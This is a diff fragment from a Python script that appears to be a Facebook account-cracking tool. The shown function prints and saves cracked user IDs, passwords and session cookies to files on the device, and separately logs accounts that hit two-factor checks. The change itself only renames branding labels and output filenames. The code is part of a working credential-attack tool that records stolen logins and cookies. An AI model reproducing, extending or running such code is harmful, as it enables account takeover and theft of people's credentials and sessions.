@@ -211,7 +211,7 @@ def graphrm(id,psd,tid):
             print(f'''\r\r\x1b[10;92m[Rahim-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{rahimx(iid)}''')
             os.system('espeak -a 300 "Rahim,  Ok,  id"')
             ok.append(id)
-            open('/sdcard/1T-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
+            open('/sdcard/Rahim-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
             if 'y' in cokix:
                 print(f'''\r\r\x1b[10;93m[🌺] \x1b[10;91m= \x1b[10;93mCOOKIES\x1b[10;91m •  \x1b[10;94m{coki}{E}''')
                 print(f'''\x1b[10;97m{'==============================================='}{E}''')
@@ -219,7 +219,7 @@ def graphrm(id,psd,tid):
         else:
             if twfx in str(lo):
                 iid = lo['error']['error_data']['uid']
-                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Tutul-2F] {iid} | {psw}{W}''')
+                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Rahim-2F] {iid} | {psw}{W}''')
                 os.system('espeak -a 300 \"2F\"')
                 open('/sdcard/1T-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                 twf.append(id)
